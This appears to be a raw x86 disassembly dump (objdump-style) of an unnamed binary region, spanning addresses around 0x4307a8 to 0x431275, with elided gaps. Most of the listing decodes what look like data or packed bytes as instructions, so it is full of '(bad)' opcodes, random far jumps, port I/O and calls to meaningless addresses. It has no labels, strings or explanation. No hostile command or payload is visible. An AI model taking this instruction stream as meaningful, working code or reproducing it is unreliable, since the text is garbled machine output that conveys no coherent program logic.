  4307a8:	mov    ebp,0xefd026c6
  4307ad:	div    DWORD PTR ds:[edi+0x510bcd57]
  4307b4:	add    eax,0xf6c199ff
  4307b9:	out    0xe,eax
  4307bb:	jmp    0x430804
  4307bd:	sbb    BYTE PTR [ebp+0x37c3c0e6],ch
  4307c3:	cmp    ebx,esi
  4307c5:	outs   dx,DWORD PTR ds:[esi]
  4307c6:	pop    eax
  4307c7:	jmp    0x62cc:0x1e6b5edf
  4307ce:	pushf  
  4307cf:	test   DWORD PTR [edx+0x51d5a7df],esp
  4307d5:	xor    al,0x22
  4307d7:	aaa    
  4307d8:	inc    ebx
  4307d9:	leave  
  4307da:	aad    0xa1
  4307dc:	and    eax,0x6a06930a
  4307e1:	xor    WORD PTR ss:[edx-0x66b7e556],di
  4307e9:	std    
  4307ea:	dec    esi
  4307eb:	dec    edi
  4307ec:	loop   0x430777
  4307ee:	push   ss
  4307ef:	(bad)  ds:0x6d5441f0
  4307f5:	shr    DWORD PTR [edi],0xbe
  4307f8:	hlt    
  4307f9:	mov    edx,DWORD PTR [edx-0x3fcd49cd]
  4307ff:	mov    ds:0x5f70f9d4,al
  430804:	xor    eax,0x5c50683
  430809:	(bad)  
  43080a:	xchg   ebx,eax
  43080b:	and    eax,0x6757d561
  430810:	cmp    DWORD PTR [edx],eax
  430812:	xchg   ebx,eax
  430814:	test   DWORD PTR [edi+0x6181b8e2],esp
  43081a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43081b:	sbb    DWORD PTR [ecx-0x6b],edi
  43081e:	packsswb mm6,QWORD PTR [esi]
  430821:	and    al,0x7e
  430823:	or     al,0x87
  430825:	mov    dh,0x38
  430827:	or     dh,ch
  430829:	mov    eax,ds:0x38c34464
  43082e:	push   esi
  43082f:	xchg   edx,eax
  430830:	popf   
  430831:	cbw    
  430833:	mov    ch,0x2f
  430835:	loope  0x430838
  430837:	(bad)  
  430838:	not    DWORD PTR [edx-0x72]
  43083b:	pop    esp
  43083c:	fwait
  43083d:	mov    edi,0x23f729
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	int    0xd3
  4308c2:	mov    dh,0x20
  4308c4:	(bad)  
  4308c6:	add    DWORD PTR [eax],eax
  4308c8:	cmc    
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    bl,dh
  4308cd:	inc    eax
  4308ce:	aaa    
  4308cf:	and    BYTE PTR [eax+ebx*4-0x51],dh
  4308d3:	cmovns ebx,DWORD PTR [eax+eax*4]
  4308d7:	not    BYTE PTR [eax+0x33]
  4308da:	shl    DWORD PTR [edx],1
  4308dc:	mov    ebp,0xc208be39
  4308e1:	bound  eax,QWORD PTR [eax]
  4308e3:	test   al,0x1
  4308e5:	push   ds
  4308e6:	xchg   DWORD PTR [edi],ebp
  4308e8:	mov    dl,0xb1
  4308ea:	clc    
  4308eb:	xor    edx,DWORD PTR [ecx]
  4308ed:	inc    ecx
  4308ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4308ef:	lea    esi,ds:0xcf247054
  4308f5:	xchg   edi,eax
  4308f6:	mov    ds:0xf9bbdfb,al
  4308fb:	xor    ebx,DWORD PTR [eax-0x48]
  4308fe:	xchg   esi,eax
  4308ff:	or     DWORD PTR [ebx],0xffffff9a
  430902:	inc    ebx
  430903:	push   cs
  430904:	outs   dx,DWORD PTR ds:[esi]
  430905:	ret    0xa0e3
  430908:	fstp   QWORD PTR [eax+eax*1]
  43090b:	push   cs
  43090c:	imul   edx,ebx,0xffffffe5
  43090f:	data16 outs dx,BYTE PTR ds:[esi]
  430911:	hlt    
  430912:	loopne 0x430914
  430914:	mov    esp,edx
  430916:	out    dx,al
  430917:	imul   edi,DWORD PTR [edi+0x260d97f8],0xffffffde
  43091e:	sub    esi,DWORD PTR [ecx+eiz*2+0x37]
  430922:	mov    ch,0x6
  430924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430925:	scas   al,BYTE PTR es:[edi]
  430926:	outs   dx,DWORD PTR ds:[esi]
  430927:	mov    ebp,0x8f2caae7
  43092c:	fistp  DWORD PTR [esi+0x20af81c5]
  430932:	and    BYTE PTR [edx],ch
  430934:	add    bl,ch
  430936:	sbb    ebp,0x46
  430939:	or     BYTE PTR [edx-0x43],0xc9
  43093d:	ins    BYTE PTR es:[edi],dx
  43093e:	(bad)  
  43093f:	out    0xef,eax
  430941:	dec    esi
  430942:	sbb    ebx,DWORD PTR [esi-0x36]
  430945:	test   BYTE PTR [edx],0x45
  430948:	outs   dx,BYTE PTR ds:[esi]
  430949:	daa    
  43094a:	(bad)  
  43094b:	add    al,0xc5
  43094d:	popa   
  43094e:	sbb    esi,esp
  430950:	test   ebp,edx
  430952:	ins    DWORD PTR es:[edi],dx
  430953:	js     0x430926
  430955:	jne    0x4308e7
  430957:	push   ss
  430958:	imul   esi,ebx,0xa0d2d512
  43095e:	bound  edi,QWORD PTR fs:0x2681f173
  430965:	fcom   DWORD PTR [ecx+0x478f9cb7]
  43096b:	sbb    al,0x7c
  43096d:	popf   
  43096e:	pop    ebx
  43096f:	jmp    0x4309df
  430971:	jmp    0x430966
  430973:	pop    edi
  430974:	cmp    al,0x32
  430977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430978:	mov    WORD PTR [eax+0x2799c81a],?
  43097e:	nop
  43097f:	idiv   BYTE PTR [eax]
  430981:	push   es
  430982:	and    al,0xbe
  430984:	mov    DWORD PTR [ebx+0x7d5330dd],edx
  43098a:	cmp    eax,0xac5c42ac
  43098f:	clc    
  430990:	dec    esp
  430991:	(bad)  
  430992:	mov    ds:0x8ac7a258,al
  430997:	sub    al,0x14
  430999:	ds inc edi
  43099b:	dec    esp
  43099c:	ds icebp 
  43099e:	out    dx,al
  43099f:	pop    es
  4309a0:	dec    ebx
  4309a1:	outs   dx,DWORD PTR ds:[esi]
  4309a2:	inc    bx
  4309a4:	jo     0x43097b
  4309a6:	mov    es,WORD PTR [eax+0x1f]
  4309a9:	sub    BYTE PTR [esp+eax*2],al
  4309ac:	cdq    
  4309ad:	mov    ah,0xf3
  4309af:	in     eax,dx
  4309b0:	aaa    
  4309b1:	mov    dl,0x2d
  4309b3:	out    dx,eax
  4309b4:	inc    eax
  4309b5:	outs   dx,BYTE PTR ds:[esi]
  4309b6:	or     eax,ebx
  4309b8:	mov    edi,DWORD PTR [edi+0x33133ec5]
  4309be:	faddp  st(4),st
  4309c0:	push   es
	...
  430a31:	add    BYTE PTR [eax],al
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0xdc6b8f37
  430a43:	or     esp,edx
  430a45:	add    BYTE PTR [edx],al
  430a47:	add    ch,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [ecx+ecx*2-0x6f],ch
  430a4f:	lea    ecx,[ebx+eax*8]
  430a52:	push   ebp
  430a53:	loop   0x430a7c
  430a55:	mov    es,WORD PTR [edx+eiz*8]
  430a58:	jge    0x430a94
  430a5a:	and    BYTE PTR [ebx],0x75
  430a5d:	out    0xc6,eax
  430a5f:	aam    0x11
  430a61:	dec    eax
  430a62:	mov    cl,0xbc
  430a64:	mov    eax,ds:0xde1dbd9f
  430a69:	addr16 inc eax
  430a6b:	and    eax,0x666ce576
  430a70:	sbb    DWORD PTR [ebx],ebx
  430a72:	mov    esp,0x18eaa16
  430a77:	popa   
  430a78:	mov    edi,0x99112ca1
  430a7d:	xchg   edi,eax
  430a7e:	ja     0x430a08
  430a80:	jmp    0xa3a80aaa
  430a85:	pop    edx
  430a86:	repnz sbb al,0x27
  430a89:	mov    edx,0x9899b188
  430a8e:	out    dx,al
  430a8f:	sbb    cl,BYTE PTR [esi-0x33e2cc9]
  430a95:	jecxz  0x430a66
  430a97:	jmp    0x3eb2:0xb46f9bf1
  430a9e:	fldenv [eax+0x3c2fbfe1]
  430aa5:	xchg   ecx,eax
  430aa6:	cmp    cl,ah
  430aa8:	(bad)  
  430aa9:	(bad)  
  430aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430aab:	scas   al,BYTE PTR es:[edi]
  430aac:	inc    esp
  430aad:	push   cs
  430aae:	inc    esp
  430aaf:	je     0x430ac1
  430ab1:	pushw  ds
  430ab3:	mov    cl,BYTE PTR [ecx-0x187bc8da]
  430ab9:	mov    bl,0x88
  430abb:	mov    dl,0x28
  430abd:	pushf  
  430abe:	pop    edx
  430abf:	imul   eax,DWORD PTR [edi],0xffffffb2
  430ac2:	jmp    0x430ae5
  430ac4:	in     eax,0xdb
  430ac6:	push   edi
  430ac7:	fnstsw WORD PTR [ebp+0x11]
  430aca:	jl     0x430a7c
  430acc:	cli    
  430acd:	dec    esp
  430ace:	clc    
  430acf:	out    0xac,al
  430ad1:	and    BYTE PTR [ebx+edx*8-0x6b49a355],bl
  430ad8:	ins    BYTE PTR es:[edi],dx
  430ad9:	or     DWORD PTR [ebp+0x30b65125],edi
  430adf:	mov    ebx,0x8ea22615
  430ae4:	(bad)  
  430ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ae6:	jno    0x430b10
  430ae8:	fst    DWORD PTR [edi+0x221776]
  430aee:	and    edx,DWORD PTR [ecx+ebp*2]
  430af1:	cmp    BYTE PTR [ebp+0x48],0x7
  430af5:	inc    esi
  430af6:	pop    esi
  430af7:	add    BYTE PTR [ecx],0xe9
  430afa:	push   esi
  430afb:	loopne 0x430a82
  430afd:	push   cs
  430afe:	sub    BYTE PTR [esi+0x54436bd8],ah
  430b04:	pop    es
  430b05:	jg     0x430ab6
  430b07:	sti    
  430b08:	mov    dl,0x33
  430b0a:	cmp    ebx,edi
  430b0c:	add    al,BYTE PTR [esi-0x5f]
  430b0f:	sar    DWORD PTR [eax-0x4b],1
  430b12:	inc    edi
  430b13:	xlat   BYTE PTR ds:[ebx]
  430b14:	xchg   esp,eax
  430b15:	cmp    DWORD PTR [edx],eax
  430b17:	scas   eax,DWORD PTR es:[edi]
  430b18:	push   esp
  430b19:	ss or  cl,ch
  430b1c:	mov    ah,0xac
  430b1e:	xlat   BYTE PTR ds:[ebx]
  430b1f:	call   edi
  430b21:	jmp    0x430b12
  430b23:	aas    
  430b24:	scas   al,BYTE PTR es:[edi]
  430b25:	outs   dx,BYTE PTR ds:[esi]
  430b26:	mov    ds:0x8b02b8eb,eax
  430b2b:	adc    ebx,DWORD PTR [esi-0x6544f2da]
  430b31:	mov    dh,0xc1
  430b33:	stos   DWORD PTR es:[edi],eax
  430b34:	add    eax,0xd5bf3e5e
  430b39:	add    eax,0x33d6891f
  430b3e:	call   0x43a480
	...
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0xc4a4:0x3f4217e6
  430bc2:	inc    eax
  430bc3:	mov    al,0xc9
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    BYTE PTR [ecx],ah
  430bcd:	popf   
  430bce:	out    dx,eax
  430bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430bd0:	test   eax,0x26507bb1
  430bd5:	xor    BYTE PTR [edi],0x72
  430bd8:	push   edi
  430bd9:	pop    esp
  430bda:	fnstenv [esi]
  430bdc:	aaa    
  430bdd:	jbe    0x430c31
  430bdf:	in     eax,dx
  430be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430be1:	inc    esi
  430be2:	mov    cl,0x8c
  430be4:	and    bh,ch
  430be6:	sub    al,0xf
  430be8:	or     BYTE PTR [eax+0x7fc915da],cl
  430bee:	imul   ecx,DWORD PTR [ebx],0xffffffa4
  430bf1:	jge    0x430bab
  430bf3:	xchg   esp,esp
  430bf5:	push   es
  430bf6:	loop   0x430c63
  430bf8:	adc    DWORD PTR [edx+0xe],0xffffffee
  430bfc:	inc    eax
  430bfd:	bswap  eax
  430bff:	cmp    DWORD PTR [esi+0x44192da2],0x32af08f
  430c09:	mov    esp,0xda47d290
  430c0e:	pusha  
  430c0f:	fist   WORD PTR [ebx+esi*1+0x3d]
  430c13:	jg     0x430c4d
  430c15:	inc    eax
  430c16:	fcomp  DWORD PTR ds:0x88ee2a65
  430c1c:	push   edx
  430c1d:	sbb    al,0x38
  430c1f:	inc    edi
  430c20:	cwde   
  430c21:	xor    BYTE PTR ds:0x38f2cdd3,bl
  430c27:	push   esp
  430c28:	jb     0x430c91
  430c2a:	push   ds
  430c2b:	stos   DWORD PTR es:[edi],eax
  430c2c:	scas   eax,DWORD PTR es:[edi]
  430c2d:	jnp    0x430c71
  430c2f:	rcr    BYTE PTR [ebp+0x50],1
  430c32:	outs   dx,DWORD PTR ds:[esi]
  430c33:	imul   eax,edx,0x43
  430c36:	jge    0x430bd7
  430c38:	inc    edi
  430c39:	or     BYTE PTR [edi+ecx*1-0x61],ch
  430c3d:	mov    ebp,0xdcf6b779
  430c42:	mov    edi,0x1293fd9b
  430c47:	push   edi
  430c48:	cmp    BYTE PTR [esi+ebp*1-0x71],0x39
  430c4d:	mov    esi,0x397291bb
  430c52:	sub    DWORD PTR [edi-0x1297ef6f],eax
  430c58:	test   al,0xdb
  430c5a:	add    edi,DWORD PTR [edi+eax*2-0x44]
  430c5e:	jns    0x430c0f
  430c60:	cld    
  430c61:	add    BYTE PTR [ebx],dl
  430c63:	dec    ebp
  430c64:	mov    dh,0x26
  430c66:	into   
  430c67:	xor    BYTE PTR [esi-0x7b],0xd1
  430c6b:	inc    edx
  430c6c:	(bad)  
  430c6e:	das    
  430c6f:	push   ebp
  430c70:	out    dx,eax
  430c71:	test   al,0x66
  430c73:	out    0xe0,al
  430c75:	es out 0xe9,al
  430c78:	(bad)  
  430c79:	cmp    BYTE PTR [esp+ebp*1-0x2f],al
  430c7d:	jb     0x430c63
  430c7f:	(bad)  
  430c80:	pop    ebp
  430c81:	out    0xac,al
  430c83:	pop    ebx
  430c84:	std    
  430c85:	jne    0x430c4d
  430c87:	cmp    ebx,DWORD PTR [esi+0x2d]
  430c8a:	mov    eax,0x3b1bf778
  430c8f:	xchg   ebx,eax
  430c90:	lods   eax,DWORD PTR ds:[esi]
  430c91:	cmp    al,0x28
  430c93:	push   cs
  430c94:	loopne 0x430c34
  430c96:	leave  
  430c97:	pushf  
  430c98:	(bad)  [ebx]
  430c9a:	mov    eax,ds:0xcfbc78f8
  430c9f:	clc    
  430ca0:	fimul  WORD PTR [eax+0xde23525]
  430ca6:	sub    DWORD PTR [ecx-0xc2ee034],edx
  430cac:	jne    0x430c5d
  430cae:	mov    esi,0xc684881f
  430cb3:	dec    edi
  430cb4:	xchg   ebx,eax
  430cb5:	cmp    DWORD PTR [edi-0x2e],edi
  430cb8:	cmp    DWORD PTR [ecx-0x79],ecx
  430cbb:	push   ebp
  430cbc:	push   ebx
  430cbd:	dec    esp
  430cbe:	push   0xcb8e
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d41
  430d41:	gs pushf 
  430d43:	repnz mov esi,0xf5000202
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    dh,dl
  430d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d4e:	sar    BYTE PTR [eax-0x435fb80a],1
  430d54:	mov    dh,0x1b
  430d56:	les    ecx,FWORD PTR [eax-0x74]
  430d59:	imul   DWORD PTR [edi+0x5d]
  430d5c:	xchg   ebp,eax
  430d5d:	inc    eax
  430d5e:	jmp    0x430d6d
  430d60:	aaa    
  430d61:	lods   al,BYTE PTR ds:[esi]
  430d62:	ins    DWORD PTR es:[edi],dx
  430d63:	pop    ecx
  430d64:	push   edi
  430d65:	imul   ebx,DWORD PTR ds:0xe821481e,0x51
  430d6c:	mov    eax,gs
  430d6e:	imul   ebp,DWORD PTR [esi],0xadb8ff8b
  430d74:	stos   BYTE PTR es:[edi],al
  430d75:	and    eax,0x97db452c
  430d7a:	loop   0x430d66
  430d7c:	jmp    0x1a75d97c
  430d81:	lods   al,BYTE PTR ds:[esi]
  430d82:	fild   WORD PTR [ebp+eax*1-0x71]
  430d86:	ins    BYTE PTR es:[edi],dx
  430d87:	cmp    edi,DWORD PTR [ebp+0x8]
  430d8a:	sub    eax,0x569ff621
  430d8f:	push   ebp
  430d90:	loopne 0x430d50
  430d92:	xlat   BYTE PTR ds:[ebx]
  430d93:	push   edi
  430d94:	ds fs test al,0x30
  430d98:	or     eax,0x15d565ca
  430d9d:	jb     0x430d91
  430d9f:	int    0xc2
  430da1:	add    BYTE PTR [edx+edx*1],bh
  430da4:	xor    esp,DWORD PTR [ecx-0x161d2b34]
  430daa:	cmp    ecx,DWORD PTR [edi+0x9]
  430dad:	ret    
  430dae:	add    eax,0x574c8f9f
  430db3:	push   esp
  430db4:	add    bl,0xff
  430db7:	mov    WORD PTR [ebp+0x6b],ds
  430dba:	lds    edi,FWORD PTR [edi-0x4]
  430dbd:	retf   0x46e8
  430dc0:	cmp    DWORD PTR [eax],ebx
  430dc2:	or     bl,al
  430dc4:	push   cs
  430dc5:	jae    0x430d71
  430dc7:	in     eax,0x89
  430dc9:	push   edx
  430dca:	push   ds
  430dcb:	jmp    0x182484d5
  430dd0:	or     BYTE PTR [esi-0x6d],al
  430dd3:	addr16 test eax,0x534af871
  430dd9:	mov    ds:0x4319e7b9,al
  430dde:	xchg   esp,eax
  430ddf:	fist   DWORD PTR [ecx]
  430de1:	in     al,dx
  430de2:	outs   dx,DWORD PTR ds:[esi]
  430de3:	jbe    0x430d79
  430de5:	aam    0x2f
  430de7:	or     esp,DWORD PTR [ebx]
  430de9:	mov    ebp,0x79181478
  430dee:	dec    ebx
  430def:	mov    ebp,0xd662f505
  430df4:	mov    ah,0x2c
  430df6:	jns    0x430e31
  430df8:	xor    bl,ah
  430dfa:	shr    DWORD PTR [edx+0x45],cl
  430dfd:	push   0xdcc7d95d
  430e02:	adc    DWORD PTR [ebp+0x6548fc0e],0xe1992010
  430e0c:	in     al,dx
  430e0d:	jmp    0x1a52e187
  430e12:	cmp    al,0x73
  430e14:	or     cl,BYTE PTR [ecx-0x598d7ec1]
  430e1a:	xor    DWORD PTR [edx-0x68b6b41a],ebp
  430e20:	(bad)  
  430e21:	pop    ds
  430e22:	mov    esp,0x296bd10c
  430e27:	rcr    DWORD PTR [ebp-0xc],0xe8
  430e2b:	mov    DWORD PTR [ebx+esi*1+0x4be68bbd],esp
  430e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430e33:	jmp    0x4632:0x8174d0a3
  430e3a:	aaa    
  430e3b:	mov    edi,0x45f547e2
  430e40:	pop    es
	...
  430eb1:	add    BYTE PTR [eax],al
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430eca
  430ec1:	arpl   WORD PTR [ebx],si
  430ec3:	aam    0xb3
  430ec5:	add    eax,DWORD PTR [edx]
  430ec7:	add    ch,dh
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [eax],ah
  430ecd:	(bad)  
  430ecf:	mov    edx,0xb5aa0d70
  430ed4:	cmp    al,0x91
  430ed6:	sbb    dh,BYTE PTR [bx]
  430ed9:	fmul   DWORD PTR [esi]
  430edb:	aam    0x79
  430edd:	dec    esp
  430ede:	test   DWORD PTR [edi+0x7b],ecx
  430ee1:	xchg   edx,eax
  430ee2:	lock ror BYTE PTR [ebx+0x3],1
  430ee6:	adc    bl,ah
  430ee8:	push   edx
  430ee9:	jmp    0x9553:0xedb441ae
  430ef0:	sbb    bh,BYTE PTR [ecx+0x1d30202b]
  430ef6:	xor    cl,BYTE PTR [ecx+esi*8-0x63]
  430efa:	adc    eax,0x3b5e343f
  430eff:	jno    0x430f00
  430f01:	cld    
  430f02:	pop    edx
  430f03:	push   edx
  430f04:	jecxz  0x430f37
  430f06:	aad    0x7a
  430f08:	dec    esi
  430f09:	xlat   BYTE PTR ds:[ebx]
  430f0a:	out    0x0,eax
  430f0c:	(bad)  
  430f0d:	imul   DWORD PTR [ecx-0x5517d286]
  430f13:	(bad)  
  430f14:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  430f16:	inc    eax
  430f17:	mov    bh,0x90
  430f19:	push   eax
  430f1a:	out    0xd7,al
  430f1c:	mov    ebp,0xce1fd9ce
  430f21:	lock mov eax,ds:0x7a939647
  430f27:	xchg   esi,eax
  430f28:	pop    ss
  430f29:	push   es
  430f2a:	or     al,0xa9
  430f2c:	mov    ecx,0xe37d3ad9
  430f31:	les    edi,FWORD PTR [edx+0x1c]
  430f34:	jmp    0x58fa:0x5d7cbc34
  430f3b:	dec    ecx
  430f3c:	or     ecx,DWORD PTR [edi]
  430f3e:	les    esi,FWORD PTR [edx+0x722fbd65]
  430f44:	dec    ebp
  430f45:	or     BYTE PTR [eax+eiz*8-0x45],bl
  430f49:	adc    esi,DWORD PTR [eax-0x71]
  430f4c:	xchg   ebx,eax
  430f4d:	(bad)
  430f50:	rcl    DWORD PTR [eax],1
  430f52:	retf   
  430f53:	pop    ss
  430f54:	popf   
  430f55:	retf   
  430f56:	aaa    
  430f57:	xchg   esp,eax
  430f58:	iret   
  430f59:	ror    BYTE PTR [ecx+0x35e91b3a],cl
  430f5f:	jno    0x430f72
  430f61:	inc    edx
  430f62:	aam    0x57
  430f64:	jg     0x430f85
  430f66:	es popa 
  430f68:	xchg   esi,eax
  430f69:	ret    0xde98
  430f6c:	xlat   BYTE PTR ds:[ebx]
  430f6d:	popa   
  430f6e:	mov    bl,0xf4
  430f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430f71:	mov    DWORD PTR cs:[ebx+0x1c9a3687],edi
  430f78:	test   DWORD PTR ds:0x3d181a3,0x16895a4
  430f82:	or     eax,0xaaffbd10
  430f87:	aam    0xd5
  430f89:	xchg   edx,ebx
  430f8b:	nop
  430f8c:	mov    ch,0x83
  430f8e:	push   cs
  430f8f:	fstp   DWORD PTR [eiz*2-0x65a65bf]
  430f96:	aad    0x57
  430f98:	adc    al,BYTE PTR [ebp-0x4a08660]
  430f9e:	mov    WORD PTR [edx+0x59],ds
  430fa1:	fadd   QWORD PTR [ebp-0x79da4d27]
  430fa7:	ret    0xbbed
  430faa:	mov    ah,0x46
  430fac:	icebp  
  430fad:	or     edi,ebx
  430faf:	and    eax,0x369a79fc
  430fb4:	fild   DWORD PTR [ebp-0x245602f6]
  430fba:	call   0x8ece225c
  430fbf:	sbb    bh,cl
	...
  431031:	add    BYTE PTR [eax],al
  431033:	add    bh,al
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	sti    
  431041:	mov    ss,WORD PTR [ebp+0x204a848]
  431047:	add    BYTE PTR [ecx+0x0],ch
  43104a:	add    BYTE PTR [eax],al
  43104c:	lock and cl,BYTE PTR [esi+edx*8]
  431050:	jbe    0x431019
  431052:	mov    al,0xbc
  431054:	and    ecx,ebx
  431056:	sub    al,0x1d
  431058:	enter  0x8e16,0xf6
  43105c:	add    al,BYTE PTR [eax-0x3d]
  43105f:	or     DWORD PTR [edx],0xffffffc9
  431062:	adc    eax,0xc97a2cb5
  431067:	into   
  431068:	dec    esi
  431069:	push   ss
  43106a:	mov    ds:0x9b49442f,eax
  43106f:	cs retf 0x465a
  431073:	pop    ebx
  431074:	ins    DWORD PTR es:[edi],dx
  431075:	imul   DWORD PTR [eax]
  431077:	call   0x3ff2194e
  43107c:	in     eax,0xb7
  43107e:	push   0x56
  431080:	loopne 0x4310be
  431082:	aad    0xb3
  431084:	adc    eax,edx
  431086:	or     DWORD PTR [edi+0x5c00bb3d],edx
  43108c:	hlt    
  43108d:	nop
  43108e:	push   ecx
  43108f:	mov    WORD PTR [edx-0x5764e8e8],?
  431095:	xor    al,0xd4
  431097:	sbb    eax,0x46c7f734
  43109c:	inc    ebp
  43109d:	add    eax,0xe5b18201
  4310a2:	sbb    al,0x2d
  4310a4:	add    edi,esp
  4310a6:	pop    ds
  4310a7:	xor    dh,BYTE PTR [eax]
  4310a9:	cmp    DWORD PTR [ebp-0x29c9d9ed],esp
  4310af:	dec    ecx
  4310b0:	pop    eax
  4310b1:	sub    bl,BYTE PTR [ebx+0x8f1]
	...
  431133:	add    BYTE PTR [ebp+0x55],cl
  431136:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43113c:	mov    esp,ebp
  43113e:	or     al,ah
  431140:	dec    ebp
  431141:	add    bh,al
  431143:	add    BYTE PTR [eax],cl
  431145:	add    BYTE PTR [eax],al
  431147:	mov    DWORD PTR [eax],0x3ef44545
  43114d:	add    BYTE PTR ss:[ebp-0x70b6375],al
  431154:	retf   
  431155:	(bad)  
  431156:	enter  0x4d45,0xb8
  43115a:	mov    edi,DWORD PTR [ecx]
  43115c:	hlt    
  43115d:	test   ebx,ecx
  43115f:	pushf  
  431160:	enter  0x4df8,0x8b
  431164:	mov    DWORD PTR [ebp+0x8],0x894708
  43116b:	inc    ebp
  43116c:	mov    ebp,0xff8bfffc
  431171:	dec    ebp
  431172:	mov    ch,0xf4
  431174:	call   DWORD PTR [ebx-0x1]
  431177:	mov    ebx,0x8005122
  43117c:	call   DWORD PTR [ecx+0x8]
  43117f:	pop    es
  431180:	jmp    0xb8:0x9cb4533
  431187:	cdq    
  431188:	mov    esi,DWORD PTR [edx-0xc]
  43118b:	xor    al,bl
  43118d:	add    BYTE PTR [ecx+0x3c83203],bl
  431193:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431199:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43119f:	xor    eax,DWORD PTR [eax]
  4311a1:	retf   
  4311a2:	ret    
  4311a3:	add    eax,esi
  4311a5:	enter  0x8945,0x64
  4311a9:	dec    ebp
  4311aa:	sbb    ah,cl
  4311ac:	add    BYTE PTR [ebx-0xb87b277],cl
  4311b2:	dec    DWORD PTR [ebx-0xbcfb275]
  4311b8:	test   DWORD PTR [ebx],esi
  4311ba:	dec    ebx
  4311bc:	inc    DWORD PTR [ebx]
  4311be:	inc    eax
  4311bf:	enter  0x8989,0x64
  4311c3:	(bad)  
  4311c4:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4311c8:	cld    
  4311c9:	dec    DWORD PTR [ebp-0xa90001]
  4311cf:	push   edi
  4311d0:	mov    BYTE PTR [edx+0x1],ch
  4311d3:	and    BYTE PTR [eax],al
  4311d5:	pop    ecx
  4311d6:	inc    ebp
  4311d7:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4311dd:	push   0xffffff89
  4311df:	pop    ecx
  4311e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4311e1:	dec    ebp
  4311e2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4311e8:	jne    0x431232
  4311ea:	lea    eax,[eax]
  4311ec:	fs (bad) 
  4311ee:	dec    DWORD PTR [eax]
  4311f0:	mov    DWORD PTR [eax],eax
  4311f2:	test   al,0x0
  4311f4:	add    BYTE PTR [ebp-0x18],cl
  4311f7:	xor    ebp,DWORD PTR [edx]
  4311f9:	add    eax,DWORD PTR [eax]
  4311fb:	mov    eax,eax
  4311fd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431204:	inc    ebp
  431205:	mov    DWORD PTR [ebx+0x459408],ecx
  43120b:	popa   
  43120c:	mov    esp,DWORD PTR [ebp-0x75]
  43120f:	(bad)  
  431210:	cld    
  431211:	inc    eax
  431212:	cmp    bh,0x1
  431215:	lea    eax,[eax]
  431217:	and    BYTE PTR [eax],al
  431219:	inc    DWORD PTR [ecx-0x18]
  43121c:	mov    ecx,DWORD PTR [ebx]
  43121e:	cld    
  43121f:	add    BYTE PTR [ecx+0x75014d],cl
  431225:	(bad)  
  431226:	xchg   ebp,eax
  431227:	sar    bh,1
  431229:	inc    eax
  43122a:	inc    DWORD PTR [eax]
  43122c:	mov    eax,DWORD PTR [ebp-0x4]
  43122f:	xor    edx,DWORD PTR [edx+0x7201be]
  431235:	add    BYTE PTR [edx],dl
  431237:	(bad)  
  431238:	nop
  431239:	inc    ebp
  43123a:	add    BYTE PTR [ebx-0x5afb0c00],cl
  431240:	mov    al,0xff
  431242:	add    bh,bh
  431244:	add    BYTE PTR [ebx],dh
  431246:	inc    DWORD PTR [ebx]
  431248:	sbb    al,0x89
  43124a:	jne    0x431228
  43124c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  431252:	mov    eax,DWORD PTR [ebp-0xff0048]
  431258:	mov    DWORD PTR [eax-0x70],0xe870e989
  43125f:	inc    DWORD PTR [ebp-0x75]
  431262:	(bad)  [esi+ebp*8]
  431265:	test   DWORD PTR [esi-0x1],esp
  431268:	inc    ebp
  431269:	(bad)  
  43126a:	aas    
  43126b:	inc    ebp
  43126c:	(bad)  
  43126d:	lea    edi,[eax+edi*2-0x1]
  431271:	inc    edi
  431273:	mov    DWORD PTR [ecx],edi
  431275:	mov    al,ds:0x8b8000c7
